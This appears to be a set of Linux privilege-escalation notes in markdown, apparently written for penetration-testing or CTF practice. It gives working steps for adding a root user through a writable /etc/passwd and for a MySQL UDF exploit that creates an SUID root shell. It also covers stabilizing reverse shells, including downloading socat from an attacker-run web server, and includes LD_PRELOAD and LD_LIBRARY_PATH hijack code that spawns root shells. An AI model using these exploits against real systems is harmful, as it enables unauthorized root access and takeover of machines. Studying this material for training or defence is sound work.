## :notebook: /etc/cronjob Format

Cronjobs exist in a certain format, being able to read that format is important if you want to exploit a cron job. 

**#** = ID

**m** = Minute

**h** = Hour

**dom** = Day of the month

**mon** = Month

**dow** = Day of the week

**user** = What user the command will run as

**command** = What command should be run

For example,

```
#  m   h dom mon dow user  command
17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
```

## :notebook: /etc/passwd Format

The `/etc/passwd` file contains one entry per line for each user (user account) of the system. All fields are separated by a colon `:` symbol. Total of seven fields as follows. Generally, `/etc/passwd` file entry looks as follows:

```
test:x:0:0:root:/root:/bin/bash
```

### Sections

- **Username**: It is used when user logs in. It should be between 1 and 32 characters in length.
- **Password**: An `x` character indicates that encrypted password is stored in `/etc/shadow` file. Please note that you need to use the `passwd` command to compute the hash of a password typed at the CLI or to store/update the hash of the password in `/etc/shadow` file, in this case, the password hash is stored as an `x`.
- **User ID (UID)**: Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further, UID 100-999 are reserved by system for administrative and system accounts/groups.
- **Group ID (GID)**: The primary group ID (stored in /etc/group file).
- **User ID Info**: The comment field. It allows you to add extra information about the users such as user’s full name, phone number, etc. This field is used by the finger command.
- **Home directory**: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
- **Command/shell**: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it *does not have to be a shell*.

### How to exploit a writable /etc/passwd

It's simple really, if we have a writable `/etc/passwd` file, we can write a new line entry according to the above formula and create a new user! We add the password hash of our choice, and set the UID, GID and shell to root. Allowing us to log in as our own root user!

## :notebook: MySQL UDF Exploit

### Scenario

The MySQL service is running as root and the root user for the service does not have a password assigned. We can use a popular [exploit](https://www.exploit-db.com/exploits/1518) that takes advantage of **User Defined Functions (UDFs)** to run system commands as root via the MySQL service.

### Setup

Assuming an exploit source file name of `raptor_udf2.c`.

Compile the raptor_udf2.c exploit code using the following commands:

```
$ gcc -g -c raptor_udf2.c -fPIC
$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Connect to the MySQL service as the root user with a blank password:

```
mysql -u root
```

Execute the following commands on the MySQL shell to create a User Defined Function (UDF) `do_system` using our compiled exploit:

```
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

Use the function to copy `/bin/bash` to `/tmp/rootbash` and set the SUID permission:

```
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

### Exploit

Exit out of the MySQL shell (type `exit` or `\q` and press Enter) and run the `/tmp/rootbash` executable with `-p` to gain a shell running with root privileges:

```
/tmp/rootbash -p
```

## :notebook: Shell Stabilization

- [rlwrap](#page_facing_up-rlwrap)
- [Stabilizing With Socat](#page_facing_up-stabilizing-with-socat)
- [Stabilizing A Linux Shell](#page_facing_up-stabilizing-a-linux-shell)

### :page_facing_up: rlwrap

**rlwrap** is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with `sudo apt install rlwrap`.

To use rlwrap, we invoke a slightly different listener:

```
rlwrap nc -lvnp <port>
```

Prepending our netcat listener with `rlwrap` gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by backgrounding the shell with Ctrl+Z, then use `stty raw -echo; fg` to stabilise and re-enter the shell.

### :page_facing_up: Stabilizing With Socat

Another way to stabilize a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`).

For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`).
 
### :page_facing_up: Stabilizing A Linux Shell

- `python -c 'import pty;pty.spawn("/bin/bash")'`, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace `python` with `python2` or `python3` as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl+C will kill the shell.
- `export TERM=xterm` will give us access to term commands such as `clear`.
- background the shell using Ctrl+Z. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl+C to kill processes). It then foregrounds the shell, thus completing the process.
- Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type `reset` and press enter.

## :notebook: Sudo - Environment Variables

### Scenario 1

Running `sudo -l` on a user shows that both `LD_PRELOAD` and `LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.

```
$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```

#### Set Up

Create and compile the following shared object named `preload.c`.

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```
$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```

#### Exploit

Run one of the programs you are allowed to run via sudo (listed when running `sudo -l`), while setting the `LD_PRELOAD` environment variable to the full path of the new shared object:

```
$ sudo LD_PRELOAD=/tmp/preload.so program-name-here
```

A root shell should spawn.

### Scenario 2

Given the same `sudo -l` output as **Scenario 1**.

Run `ldd` against the `apache2` program file to see which shared libraries are used by the program:

```
$ ldd /usr/sbin/apache2
        linux-vdso.so.1 =>  (0x00007fff0ddff000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007fc5fabf9000)
        libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007fc5fa9d5000)
        libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007fc5fa79b000)
        libpthread.so.0 => /lib/libpthread.so.0 (0x00007fc5fa57f000)
        libc.so.6 => /lib/libc.so.6 (0x00007fc5fa213000)
        libuuid.so.1 => /lib/libuuid.so.1 (0x00007fc5fa00e000)
        librt.so.1 => /lib/librt.so.1 (0x00007fc5f9e06000)
        libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007fc5f9bcf000)
        libdl.so.2 => /lib/libdl.so.2 (0x00007fc5f99ca000)
        libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007fc5f97a2000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fc5fb0b6000)
```

#### Set Up

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the following code:

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```
$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
```

#### Exploit

Run apache2 using sudo, while settings the `LD_LIBRARY_PATH` environment variable to `/tmp` (where we output the compiled shared object):

```
$ sudo LD_LIBRARY_PATH=/tmp apache2
```

A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. Did it work? If not, try to figure out why not, and how the library_path.c code could be changed to make it work.
